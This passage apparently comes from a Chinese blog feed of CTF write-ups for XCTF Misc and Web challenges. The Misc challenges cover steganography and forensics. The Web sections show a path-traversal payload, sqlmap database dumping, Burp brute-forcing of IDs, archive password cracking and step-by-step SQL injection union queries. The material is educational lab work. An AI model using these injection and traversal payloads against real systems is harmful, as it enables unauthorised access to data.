1得到flag：SECCON{@]NL7n+-s75FrET]vU=7Z}</p><p>（7）还有一种方法，在得知1的类型为gzip压缩文件后，修改后缀，文件名改为1.gz，然后解压</p><pre><code>gunzip 1.gz</code></pre><p>（8）解压成功，依然得到一个名为1的文件，再次查看该文件类型</p><pre><code>file 1</code></pre><p><img src="https://i.loli.net/2020/11/16/HrIy7Ua2vbnmzD5.png" alt="image-20201116165042375"></p><p>（9）是一个ASCII码的文件，用cat查看内容，得到flag</p><p><img src="https://i.loli.net/2020/11/16/JVIY64MigQ9Hdsz.png" alt="image-20201116165159099"></p><h2 id="就在其中"><a href="#就在其中" class="headerlink" title="就在其中"></a>就在其中</h2><p>（1）下载附件，得到一个流量包，用wireshark打开，搜索字符flag，但并没有任何信息</p><p>（2）将该流量包放到kali中binwalk一下，查看是否存在隐藏文件</p><p><img src="https://i.loli.net/2020/11/20/BHCYuVwWea1DPhn.png" alt="image-20201120202514449"></p><p>（3）确实存在隐藏文件，用foremost工具分离文件，得到jpg、pdf、zip三个文件夹</p><p><img src="https://i.loli.net/2020/11/20/Up1ZiB2VeNnJzuL.png" alt="image-20201120202620317"></p><p>（4）其中jpg和pdf文件夹下并没有明显的flag信息，zip下有一个压缩包，加压后得到一个文档key.txt，但却是一串奇怪的字符</p><p><img src="https://i.loli.net/2020/11/20/IjmJZKQ9RCN54ak.png" alt="image-20201120203033157"></p><p>（5）再次打开流量包，搜索key字符</p><p><img src="https://i.loli.net/2020/11/20/3EqQp7hHclIzkw5.png" alt="image-20201120204201790"></p><p>（6）可以看到先进行tcp连接，再进行ftp传输，应该是一个在传输某些文档的流量包，flag信息应该和传输的文档有关，追踪tcp流，发现了RSA私钥</p><p><img src="https://i.loli.net/2020/11/20/TYaGp3WhDRorI1M.png" alt="image-20201120205800250"></p><p>（7）将这串字符全部复制到一个文本中，命名为rsa.key，放到kali中的openssl进行解密</p><pre><code>openssl rsautl -decrypt -in key.txt -inkey rsa.key -out flag.txt// -in 为要解密的加密文档   -inkey  为密钥      -out  为输出文档</code></pre><p><img src="https://i.loli.net/2020/11/20/wdJftIDXWbpjoxV.png" alt="image-20201120210306217"></p><p>（8）查看flag.txt</p><p><img src="https://i.loli.net/2020/11/20/k21zZ48GylfohpR.png" alt="image-20201120210509016"></p><h2 id="Reverse-it"><a href="#Reverse-it" class="headerlink" title="Reverse-it"></a>Reverse-it</h2><p>（1）下载得到一个附件，用010 editor打开，但无法明显看出是什么类型的文件，再放到kali中binwalk一下，依然没有发现。</p><p>（2）根据题目Reverse-it，逆向它，再仔细观察010 editor里的十六进制编码</p><p><img src="https://i.loli.net/2020/11/22/MEG51FuCgRwp83r.png" alt="image-20201122164943736"></p><p><img src="https://i.loli.net/2020/11/22/5jTNkhSzX46lYGr.png" alt="image-20201122165014259"></p><p>（3）在文件头和文件尾发现了特殊的编码，联想jpg的图片格式，以FF D8开头，FF D9结尾。所以整个文件被倒过来了，需要再将其逆转回去。这里借助Python脚本。</p><pre><code class="python">import osf = open(&#39;1&#39;,&quot;rb&quot;)#二进制形式打开f = f.read()[::-1]for i in f:    ans = str(hex(i))[2:][::-1]    if len(ans) == 1:        ans = ans + &#39;0&#39;    print(ans,end=&#39;&#39;)</code></pre><p>（4）将得到的新文件保存并名为jpg格式，得到一张图片</p><p><img src="https://i.loli.net/2020/11/22/mzhyvHuLsipbgt8.png" alt="image-20201122165457966"></p><p>（5）可以看到是张翻转过的图片，这里可以使用windows下的画图工具将其水平翻转过来，也可以利用Python脚本。</p><pre><code class="python">from PIL import Imageim = Image.open(&quot;t.jpg&quot;)pim = im.load()an = Image.open(&quot;t.jpg&quot;)ans = an.load()for i in range(im.size[0]):    for j in range(im.size[1]):        ans[i, j] = pim[im.size[0]-i-1, j]an.show()</code></pre><p><img src="https://i.loli.net/2020/11/22/fvH2PcDKqViZsFA.png" alt="image-20201122165652047"></p><h2 id="打野"><a href="#打野" class="headerlink" title="打野"></a>打野</h2><p>（1）得到一张坤坤的bmp格式图片，放到kali中binwalk一下，并没有发现隐藏的文件。再用strings查看，同样没有得到flag的信息。最后使用kali中的zsteg工具，该工具可以检测png和bmp图片里的隐写数据。</p><pre><code>zsteg &#39;文件路径&#39;zsteg /root/Desktop/CTF/XCTF/Misc/005/瞅啥.bmp</code></pre><p><img src="https://i.loli.net/2020/11/23/K3pOT2NVXjUgEtd.png" alt="image-20201123204350799"></p><p>（2）得到flag</p><h2 id="倒立屋"><a href="#倒立屋" class="headerlink" title="倒立屋"></a>倒立屋</h2><p>（1）下载附件，得到一个png图片。放到kali下binwalk一下，发现存在zlib压缩数据</p><p><img src="https://i.loli.net/2020/11/27/fWNTdMEnOlRx2cB.png" alt="image-20201127205100279"></p><p>（2）用kali中的工具zsteg看看图片中的隐藏数据</p><p><img src="https://i.loli.net/2020/11/27/bxRwAtQX8spzrKc.png" alt="image-20201127205231331"></p><p>（3）得到字符IsCc_2019,但直接提交是错误的，根据题意，需要倒过来，所以就是flag{9102_cCsI}</p><h2 id="2017-Dating-in-Singapore"><a href="#2017-Dating-in-Singapore" class="headerlink" title="2017_Dating_in_Singapore"></a>2017_Dating_in_Singapore</h2><p>（1）下载附件，得到一份PDF文件，是2017年新加坡的日历。再看看提示，由’-‘分隔了12串数字，联想到对应的12个月。</p><p><img src="https://i.loli.net/2020/12/02/tF7KdViY8BfLwhj.png" alt="image-20201202180623816"></p><p>（2）将上述12串字符放到一个文本文档中，并分类为12行。</p><p><img src="https://i.loli.net/2020/12/02/DraloOHzsf5xWbG.png" alt="image-20201202180924011"></p><p>（3）每串数字对应一个月的日期，将其分为两两一组。</p><p><img src="https://i.loli.net/2020/12/02/4UzN7R6TObxAGec.png" alt="image-20201202181311182"></p><p>（5）对比一开始得到的PDF文件，得到HITB{CTFFUN}</p><p><img src="https://i.loli.net/2020/12/02/AfM5WVNdiwLzKt9.png" alt="image-20201202181507644"></p>]]></content>
      
      
      <categories>
          
          <category> XCTF_Misc进阶区 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF_Misc_003</title>
      <link href="2020/11/15/XCTF/XCTF_Misc-003/"/>
      <url>2020/11/15/XCTF/XCTF_Misc-003/</url>
      
        <content type="html"><![CDATA[<h2 id="simple-transfer"><a href="#simple-transfer" class="headerlink" title="simple_transfer"></a>simple_transfer</h2><p>（1）下载附件，得到一个流量包，用wireshark打开，在搜索框输入tcp contains flag查找flag，并没有发现有用信息。<br><img src="https://img-blog.csdnimg.cn/20201104185840360.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">（2）放到kali下，用foremost分解，得到一个pdf文件，打开看到flag。<br><img src="https://img-blog.csdnimg.cn/20201104185953178.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="Hear-with-your-Eyes"><a href="#Hear-with-your-Eyes" class="headerlink" title="Hear-with-your-Eyes"></a>Hear-with-your-Eyes</h2><p>（1）下载附件，一个.gz文件，解压后是一个没有后缀名的文件，用notepad++打开，没有flag信息。直接用7-zip工具打开，发现了一个sound.wav音频文件。<br><img src="https://img-blog.csdnimg.cn/20201104193005337.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">（2）根据提示“用眼睛看这段音频”，使用audacity工具打开这个wav文件，点击“sound”切换到频谱图，就能看到flag。<br>audacity官网下载地址：<a href="https://www.audacityteam.org/">https://www.audacityteam.org/</a><br><img src="https://img-blog.csdnimg.cn/20201104194048622.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="Ditf"><a href="#Ditf" class="headerlink" title="Ditf"></a>Ditf</h2><p>（1）下载得到一张png图片，notepad++打开，没发现啥信息，修改下图片高度看看。<br><img src="https://img-blog.csdnimg.cn/20201105114640452.png#pic_center" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20201105120341660.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>（2）发现一串字符StRe1izia，应该是一个密码，将图片放到kali下用foremost分解，得到一个压缩包，解压需要密码，输入该串字符，成功解压。</p><p><img src="https://img-blog.csdnimg.cn/20201105120813523.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>。<br>（3）解压后得到一个Ditf.pcapng文件，用wireshark打开。Ctrl+F，选择字符串，搜索flag，无果。再搜索png，发现一个kiss.png。<br><img src="https://img-blog.csdnimg.cn/20201105123523762.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">（4）追踪http流，发现一串特征明显的代码<br><img src="https://img-blog.csdnimg.cn/202011051236377.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">（5）用base64解码，得到flag。<br><img src="https://img-blog.csdnimg.cn/20201105123710874.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="神奇的Modbus"><a href="#神奇的Modbus" class="headerlink" title="神奇的Modbus"></a>神奇的Modbus</h2><p>（1）用wireshark打开附件，根据题意，输入modbus过滤，并追踪tcp流，可发现flag。<br><img src="https://img-blog.csdnimg.cn/20201107144903770.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/2020110714492428.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">（2）提交flag时注意题目格式为sctf{xxx}，但提交sctf{Easy_Mdbus}错误，仔细观察，根据题目，应提交sctf{Easy_Modbus}，多加一个o</p><h2 id="glance-50"><a href="#glance-50" class="headerlink" title="glance-50"></a>glance-50</h2><p>（1）附件是一张长条状的gif动图，很有可能就是分离gif的每一帧然后拼接形成图片得到flag。<br><img src="https://img-blog.csdnimg.cn/20201108120310683.png#pic_center" alt="在这里插入图片描述"></p><p>（2）将该图片放到kali里，用convert命令可以分解GIF图片</p><pre><code>convert 9266eadf353d4ada94ededaeb96d0c50.gif flag.png</code></pre><p><img src="https://img-blog.csdnimg.cn/20201108121130666.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201108120605449.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">（3）用convert分解出了200张图片，接下来就是图片的拼接。依旧使用kali下的工具montage。</p><pre><code>montage flag*.png -tile x1 -geometry +0+0 flag.png//-tile是拼接时每行和每列的图片数，这里用x1，就是只一行//-geometry是首选每个图和边框尺寸，边框为0，图照原始尺寸即可</code></pre><p><img src="https://img-blog.csdnimg.cn/20201108121230526.png#pic_center" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20201108121308124.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">（4）flag为TWCTF{Bliss by Charles O’Rear}</p><h2 id="What-is-this"><a href="#What-is-this" class="headerlink" title="What-is-this"></a>What-is-this</h2><p>（1）得到一个.gz的压缩包，直接用7-zip工具打开，附件进行了两次压缩，最后得到两张类似的图片<br><img src="https://img-blog.csdnimg.cn/20201112194655132.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20201112194718517.png#pic_center" alt="在这里插入图片描述"></p><p>（2）用stegsolve工具将两张图片合成一下，得到flag<br><img src="https://img-blog.csdnimg.cn/20201112194751259.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="再见李华"><a href="#再见李华" class="headerlink" title="再见李华"></a>再见李华</h2><p>（1）下载附件得到一张图片，图上是md5的信息，但解密不出来。放到kali中binwalk一下，发现还有一个压缩包。用foremost分离文件，得到压缩包，但解压需要密码。<br><img src="https://img-blog.csdnimg.cn/20201114112042304.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）根据题目提示，1000个字，署名，LiHua<br>猜测1000个字是4位，LiHua是密码的一部分，将这两个部分组合起来，用ARCHPR进行爆破<br><img src="https://img-blog.csdnimg.cn/20201114112209518.png#pic_center" alt="在这里插入图片描述"><br>（3）爆破时攻击类型选择“掩码”，并设置掩码“????LiHua”<br><img src="https://img-blog.csdnimg.cn/20201114112817329.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（4）成功破解，得到密码15CCLiHua，解压后得到flag<br><img src="https://img-blog.csdnimg.cn/20201114112938259.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> XCTF_Misc进阶区 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF_Web_005</title>
      <link href="2020/11/15/XCTF/XCTF_Web-005/"/>
      <url>2020/11/15/XCTF/XCTF_Web-005/</url>
      
        <content type="html"><![CDATA[<h2 id="NaNNaNNaNNaN-Batman"><a href="#NaNNaNNaNNaN-Batman" class="headerlink" title="NaNNaNNaNNaN-Batman"></a>NaNNaNNaNNaN-Batman</h2><p>（1）下载附件，是一个没有后缀名的文件，用notepad++打开<br><img src="https://img-blog.csdnimg.cn/20201104203101152.png#pic_center" alt="在这里插入图片描述">（2）很多乱码，但从&lt;script&gt;中可以看出是这是一段js代码，需要用浏览器打开。将文件后缀名改为.html，点击打开。<br><img src="https://img-blog.csdnimg.cn/20201104203445934.png#pic_center" alt="在这里插入图片描述">（3）有一个输入框，但是输什么都没有反应。查看网页源代码，发现源代码里有乱码。<br><img src="https://img-blog.csdnimg.cn/20201104203642634.png#pic_center" alt="在这里插入图片描述"></p><p>(4）出现乱码是因为 html 无法识别某些编码，在“eval”前添加一句“alert(_);”。重新用浏览器打开，即显示出正常代码。<br><img src="https://img-blog.csdnimg.cn/20201104210527470.png#pic_center" alt="在这里插入图片描述">（5）使用在线网站将这段js代码对齐 <a href="https://beautifier.io/">https://beautifier.io/</a><br><img src="https://img-blog.csdnimg.cn/20201104211100387.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">（6）可以看到需要满足几个 if 中的正则表达式条件，^表示开始，$表示结尾，同时还要满足长度为16位。<br>把匹配出来的值be0f233ac7be98aa，输入到网页中的输入框就得到了flag。<br><img src="https://img-blog.csdnimg.cn/20201104212001550.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201104212019299.png#pic_center" alt="在这里插入图片描述"></p><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>（1）打开网址，根据注释中的提示，逆向加密算法，解密$miwen就能得到flag<br><img src="https://img-blog.csdnimg.cn/20201114164452564.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）分析其中的PHP内置函数</p><pre><code>strrev(string): 反转字符串strlen(string): 返回字符串的长度substr(string, start, length): 返回字符串的一部分   //string: 所需要的字符串//start: 在字符串何处开始//length: 可选。规定被返回字符串的长度。默认是直到字符串的结尾ord(string): 返回字符串首个字符的 ASCII 值chr(): 从指定的 ASCII 值返回对应的字符str_rot13(string): 对字符串执行 ROT13 编码。//ROT13 编码把每一个字母在字母表中向前移动 13 个字母。数字和非字母字符保持不变base64_encode(string): 使用 MIME base64 对数据进行编码</code></pre><p>(3)分析网址中的函数</p><pre><code>&lt;?php$miwen=&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;;function encode($str)&#123;                //给encode一个参数 $str    $_o=strrev($str);                 //将所传参数 $str 通过 strrev() 函数反转字符串操作并赋值给 $_o    // echo $_o;    for($_0=0;$_0&lt;strlen($_o);$_0++)&#123;          //循环遍历 变量 $_o        $_c=substr($_o,$_0,1);    //在for循环中首先依次取字符串 $_o 的第 $_0 个值，赋值给 $_c        $__=ord($_c)+1;  //将变量 $c 转化为 ASCII码 并 +1，赋值给 $_        $_c=chr($__);   //将 $__ 转化为该ASCII码所对应的字符，赋值给 $_c        $_=$_.$_c;     //拼接字符串，赋值给$_    &#125;     return str_rot13(strrev(base64_encode($_)));      //将拼接好后的字符串 $_ 先进行 base64编码，再将编码后的值进行反转字符串操作，    //最后对反转后的字符串进行 rot13 加密，得出结果为$miwen&#125;highlight_file(__FILE__);/*   逆向加密算法，解密$miwen就是flag*/?&gt;</code></pre><p>（4）用在线工具写出逆向代码 <a href="https://tool.lu/coderunner/">https://tool.lu/coderunner/</a></p><pre><code>&lt;?php$str=&#39;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&#39;;$_ = base64_decode(strrev(str_rot13($str)));$_o=NULL;for($_0=0;$_0&lt;strlen($_);$_0++)&#123;          $_c=substr($_,$_0,1);          $__=ord($_c)-1;          $_c=chr($__);          $_o=$_o.$_c;       &#125; echo strrev($_o);?&gt;</code></pre>]]></content>
      
      
      <categories>
          
          <category> XCTF_Web进阶区 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF_Web_004</title>
      <link href="2020/11/15/XCTF/XCTF_Web-004/"/>
      <url>2020/11/15/XCTF/XCTF_Web-004/</url>
      
        <content type="html"><![CDATA[<h2 id="ics-06"><a href="#ics-06" class="headerlink" title="ics-06"></a>ics-06</h2><p><img src="https://img-blog.csdnimg.cn/20201031154407968.png#pic_center" alt="在这里插入图片描述"><br>（1）打开网址，根据题意点击报表中心（试了一下点击其他的发现都一样）<br><img src="https://img-blog.csdnimg.cn/20201031154600915.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）发现URL栏有?id=1，使用burp爆破id。<br>（3）设置浏览器的配置为手动代理配置，burp设置为拦截请求，刷新页面<br><img src="https://img-blog.csdnimg.cn/20201031155001664.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（4）发送给Inturder，设置爆破点为id变量<br><img src="https://img-blog.csdnimg.cn/20201031155237191.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（5）把爆破变量设为数值<br><img src="https://img-blog.csdnimg.cn/20201031155404737.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（6）为了让爆破更快，这里设置多一点线程<br><img src="https://img-blog.csdnimg.cn/20201031155516421.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（7）开始攻击，发现id为2333时长度和其他数值不一样（这里不要一个一个找，点击“长”，英文版是“length”会排序）<br><img src="https://img-blog.csdnimg.cn/20201031155630573.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（8）回到网址，把id改为2333，发现flag<br><img src="https://img-blog.csdnimg.cn/20201031155907909.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><p>（1）打开网址，是一张滑稽图片，查看网页源代码，发现source.php<br><img src="https://img-blog.csdnimg.cn/20201101152117873.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>（2）进一步访问，又发现一个hint.php<br><img src="https://img-blog.csdnimg.cn/20201101152358875.png#pic_center" alt="在这里插入图片描述"></p><p>（3）这里提示了flag在这个ffffllllaaaagggg文件中<br>（4）返回source.php，继续审计代码<br><img src="https://img-blog.csdnimg.cn/20201101153340968.png#pic_center" alt="在这里插入图片描述"></p><p>（5）参数file满足三个条件，就会包含文件，file可以由自己构造。<br>条件一：检查file变量是否为空。<br>条件二：检查file变量是否为字符串。<br>条件三：通过checkFile函数来检查<br>（6）由于要构造payload，条件一和二直接满足，直接查看checkFile函数代码：<br><img src="https://img-blog.csdnimg.cn/20201101154211432.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>（7）发现包含四个if语句：<br>第一个 if 语句对变量进行检验，要求$page为字符串，否则返回 false；<br>第二个 if 语句判断$page是否存在于$whitelist数组中，存在则返回 true;<br>第三个 if 语句，截取传进参数中首次出现?之前的部分，判断该部分是否存在于$whitelist数组中，存在则返回 true;<br>第四个 if 语句，先对构造的 payload 进行 url 解码，再截取传进参数中首次出现?之前的部分，并判断该部分是否存在于$whitelist中，存在则返回 true;</p><p>#以上4个if语句，满足一个即可返回true。都未满足则返回false。<br>（8）这里用第三个if语句构造参数：</p><pre><code>?file=source.php?/../../../../ffffllllaaaagggg</code></pre><p>第一个?用来传参，第二个?用来满足截取<br><img src="https://img-blog.csdnimg.cn/20201101155834665.png#pic_center" alt="在这里插入图片描述"></p><p>（9）include<br><img src="https://img-blog.csdnimg.cn/20201101160319289.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">#因为参数有定义路径，就会忽略/前的字符串，直接去找/../../../../ffffllllaaaagggg这个文件。</p><h2 id="NewsCenter"><a href="#NewsCenter" class="headerlink" title="NewsCenter"></a>NewsCenter</h2><p><img src="https://img-blog.csdnimg.cn/20201102190517255.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">解法一：<br>（1）打开网址，如上图所示页面。考虑到xss或sql注入，试试sql注入。随便输入123后，使用burp抓包</p><p><img src="https://img-blog.csdnimg.cn/20201102190831493.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>（2）发现是post方式，直接sqlmap爆破。将这些保存在一个文本文档里，为了方便命名为1.txt。并将该文本放到sqlmap所在目录下。使用命令爆破数据库</p><pre><code>sqlmap.py -r 1.txt --dbs</code></pre><p><img src="https://img-blog.csdnimg.cn/20201102191110973.png#pic_center" alt="在这里插入图片描述"></p><p>（3）看到一个news，继续使用命令查看news数据库的内容</p><pre><code>sqlmap.py -r 1.txt -D news --dump</code></pre><p><img src="https://img-blog.csdnimg.cn/20201102191335386.png#pic_center" alt="在这里插入图片描述"></p><p>（4）发现flag</p><p>解法二：<br>（1）尝试构造语句sr’ or ‘1=1，果然返回了7条新闻。通常使用单引号，1,2等尝试，然后用union联合查询获取信息。union就是两个结果的去重合集，但前提要列数一致。因此构造语句判断数据的列数。</p><pre><code>sr&#39; union select 1,2#</code></pre><p>（2）没有正确返回结果，再试试：</p><pre><code>sr&#39; union select 1,2,3#//语句中的第一个单引号&#39;用来闭合后台的第一个&#39;，前面的sr也可改成其他字符或数字//语句中的#用来注释掉后台的第二个&#39;</code></pre><p><img src="https://img-blog.csdnimg.cn/20201102194027695.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">（3）只有1,2,3的时候才正确返回，因此数据的列数为3列。<br>（4）接下来利用information_schema来获得所有的表名，构造语句：</p><pre><code>sr&#39; union select 1,2,table_name from information_schema.tables#//前面的1，2就是凑列数的</code></pre><p>（5）得到一大串的表名，慢慢找，发现最底下有news和secret_table数据库<br><img src="https://img-blog.csdnimg.cn/20201102195426161.png#pic_center" alt="在这里插入图片描述"></p><p>（6）因为试过了news，没有结果。接下来利用information_schema.columns的结构来获得secret表的信息。我们要得到的信息也就只有列名column_name，也可以再加上column_type来查看数据类型。附上大佬的文章<a href="https://www.cnblogs.com/JiangLe/p/5793555.html">https://www.cnblogs.com/JiangLe/p/5793555.html</a>因此，构造</p><pre><code>sr&#39; union select 1,column_type,column_name from information_schema.columns where table_name=&#39;secret_table&#39;#</code></pre><p><img src="https://img-blog.csdnimg.cn/20201102200351773.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">（7）看到了flag的信息，构造语句：</p><pre><code>sr&#39; union select 1,2,fl4g from secret_table#</code></pre><p><img 